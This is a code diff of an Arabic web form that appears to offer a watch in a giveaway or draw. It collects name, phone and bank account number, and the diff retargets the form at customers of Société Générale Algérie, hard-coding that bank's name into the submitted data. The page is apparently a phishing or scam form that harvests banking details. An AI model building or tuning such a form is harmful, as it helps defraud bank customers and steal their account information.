@@ -108,6 +108,18 @@
     <p class="lead">من فضلك أدخل بياناتك لإتمام عملية السحب</p>
 
     <div class="field">
+      <label>هل أنت عميل بنك سوسيتيه جنرال الجزائر؟</label>
+      <div style="display:flex;gap:12px;margin-top:8px">
+        <label style="display:flex;align-items:center;gap:6px;font-size:15px;font-weight:500;cursor:pointer">
+          <input type="radio" name="is_bank_client" value="yes" style="width:20px;height:20px;accent-color:#c62828" required> نعم
+        </label>
+        <label style="display:flex;align-items:center;gap:6px;font-size:15px;font-weight:500;cursor:pointer">
+          <input type="radio" name="is_bank_client" value="no" style="width:20px;height:20px;accent-color:#c62828"> لا
+        </label>
+      </div>
+    </div>
+
+    <div class="field">
       <label for="name">الاسم الكامل</label>
       <input id="name" name="name" type="text" placeholder="مثال: محمد أمين" required>
     </div>
@@ -122,23 +134,6 @@
       <label for="account">رقم الحساب</label>
       <input id="account" name="account" type="tel" placeholder="أدخل رقم الحساب (6 أرقام على الأقل)"
              inputmode="numeric" minlength="6" required>
-    </div>
-
-    <div class="field">
-      <label>هل أنت عميل بنك؟</label>
-      <div style="display:flex;gap:12px;margin-top:8px">
-        <label style="display:flex;align-items:center;gap:6px;font-size:15px;font-weight:500;cursor:pointer">
-          <input type="radio" name="is_bank_client" value="yes" style="width:20px;height:20px;accent-color:#c62828" required> نعم
-        </label>
-        <label style="display:flex;align-items:center;gap:6px;font-size:15px;font-weight:500;cursor:pointer">
-          <input type="radio" name="is_bank_client" value="no" style="width:20px;height:20px;accent-color:#c62828"> لا
-        </label>
-      </div>
-    </div>
-
-    <div class="field" id="bankField" style="display:none">
-      <label for="bankName">اسم البنك</label>
-      <input id="bankName" name="bankName" type="text" placeholder="مثال: بنك الجزائر الخارجي">
     </div>
 
     <button class="submit" type="submit">تأكيد الطلب</button>
@@ -207,15 +202,6 @@
     document.getElementById("summary").classList.add("show");
   }
 
-  // إظهار/إخفاء حقل اسم البنك
-  document.querySelectorAll('input[name="is_bank_client"]').forEach(r => {
-    r.addEventListener('change', () => {
-      document.getElementById('bankField').style.display =
-        document.querySelector('input[name="is_bank_client"]:checked')?.value === 'yes' ? 'block' : 'none';
-    });
-  });
-
-  // التحقق من رقم الحساب
   document.getElementById("account").addEventListener("input", function() {
     this.value = this.value.replace(/\D/g, "");
   });
@@ -228,11 +214,7 @@
       return;
     }
     const bankChoice = document.querySelector('input[name="is_bank_client"]:checked');
-    if (!bankChoice) { alert("الرجاء اختيار هل أنت عميل بنك"); return; }
-    if (bankChoice.value === 'yes' && !document.getElementById("bankName").value.trim()) {
-      alert("الرجاء إدخال اسم البنك");
-      return;
-    }
+    if (!bankChoice) { alert("الرجاء اختيار هل أنت عميل بنك سوسيتيه جنرال"); return; }
 
     const btn = document.querySelector(".submit");
     btn.disabled = true;
@@ -247,7 +229,7 @@
           phone: document.getElementById("phone").value,
           account_number: accountVal,
           is_bank_client: bankChoice.value,
-          bank_name: bankChoice.value === 'yes' ? document.getElementById("bankName").value.trim() : '',
+          bank_name: bankChoice.value === 'yes' ? 'Societe Generale Algerie' : '',
           watch_color: watchColor,
           watch_index: (!isNaN(pick) && watches[pick]) ? pick : null,
           session_id: sessionStorage.getItem('appl_visitor_sid')||''
